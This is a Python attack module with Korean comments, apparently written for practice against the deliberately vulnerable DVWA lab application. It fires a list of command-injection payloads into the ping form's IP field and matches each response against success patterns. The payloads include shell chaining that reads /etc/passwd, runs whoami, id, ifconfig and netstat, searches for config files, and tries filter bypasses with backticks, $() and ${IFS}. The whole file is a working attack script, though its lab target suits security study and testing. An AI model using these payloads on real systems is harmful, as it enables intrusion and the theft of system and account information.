"""
Command Injection Attack Module
DVWA 명령어 인젝션 공격 모듈
"""

import time
import re
from utils.logger import log_attack

# Command Injection 페이로드 목록
PAYLOADS = [
    # Basic command injection (Linux)
    "; ls",
    "| ls",
    "& ls",
    "&& ls",
    "|| ls",
    "; pwd",
    "| pwd",
    "&& pwd",

    # 정보 수집
    "; whoami",
    "| whoami",
    "&& whoami",
    "; id",
    "| id",
    "&& id",
    "; uname -a",
    "| uname -a",

    # 파일 시스템 탐색
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "; ls -la /",
    "| ls -la /",
    "; find / -name '*.conf'",

    # 네트워크 정보
    "; ifconfig",
    "| ifconfig",
    "&& ifconfig",
    "; netstat -an",
    "| netstat -an",

    # Windows 명령어
    "& dir",
    "| dir",
    "&& dir",
    "& whoami",
    "| whoami",
    "& ipconfig",

    # Bypass 시도
    ";ls",  # 공백 없이
    ";%20ls",  # URL 인코딩
    "`ls`",  # 백틱
    "$(ls)",  # 명령어 치환
    "${IFS}ls",  # IFS 사용
]

def run_attack(session, delay=1):
    """
    Command Injection 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    for payload in PAYLOADS:
        results['attempts'] += 1

        try:
            # Command Injection 시도
            # DVWA에서는 보통 IP 주소를 입력받는 ping 기능이 있음
            params = {
                'ip': f"127.0.0.1{payload}",
                'Submit': 'Submit'
            }

            response = session.session.get(cmdi_url, params=params)

            # 명령어 실행 성공 여부 판단
            if is_command_executed(response.text, payload):
                results['successful'] += 1
                results['success'] = True
                results['findings'].append({
                    'payload': payload,
                    'response_length': len(response.text),
                    'status_code': response.status_code
                })

                log_attack(
                    'COMMAND_INJECTION',
                    'SUCCESS',
                    f"Payload: 127.0.0.1{payload}",
                    response.status_code,
                    len(response.text)
                )
                print(f"  [+] 성공: {payload}")
            else:
                log_attack(
                    'COMMAND_INJECTION',
                    'FAILED',
                    f"Payload: 127.0.0.1{payload}",
                    response.status_code,
                    len(response.text)
                )

            time.sleep(delay)

        except Exception as e:
            log_attack(
                'COMMAND_INJECTION',
                'ERROR',
                f"Payload: {payload}, Error: {str(e)}",
                0,
                0
            )
            print(f"  [-] 오류 발생: {payload} - {str(e)}")

    print(f"\n[*] Command Injection 완료: {results['successful']}/{results['attempts']} 성공\n")
    return results

def is_command_executed(response_text, payload):
    """
    명령어 실행 성공 여부 판단

    Args:
        response_text: HTTP 응답 본문
        payload: 사용한 페이로드

    Returns:
        bool: 성공 여부
    """
    # 명령어 실행 결과로 예상되는 패턴들
    success_indicators = {
        'ls': [r'\.\.', r'index\.php', r'config'],
        'pwd': [r'/var/www', r'/home', r'/usr'],
        'whoami': [r'www-data', r'apache', r'root'],
        'id': [r'uid=\d+', r'gid=\d+', r'groups='],
        'uname': [r'Linux', r'GNU', r'Ubuntu', r'Debian'],
        'cat /etc/passwd': [r'root:x:', r'/bin/bash', r'nobody'],
        'ifconfig': [r'inet', r'netmask', r'broadcast', r'eth0'],
        'netstat': [r'LISTEN', r'ESTABLISHED', r'tcp'],
        'dir': [r'Directory of', r'<DIR>'],
        'ipconfig': [r'IPv4', r'Subnet Mask', r'Default Gateway'],
    }

    # 페이로드에서 실행한 명령어 추출
    command = None
    for cmd in success_indicators.keys():
        if cmd in payload.lower():
            command = cmd
            break

    if not command:
        # 기본적인 명령어 실행 성공 패턴
        generic_patterns = [
            r'root:',
            r'www-data',
            r'uid=',
            r'Linux',
            r'Directory',
            r'/var/www',
            r'inet ',
        ]
        for pattern in generic_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    # 특정 명령어에 대한 패턴 확인
    indicators = success_indicators[command]
    for indicator in indicators:
        if re.search(indicator, response_text, re.IGNORECASE):
            return True

    return False
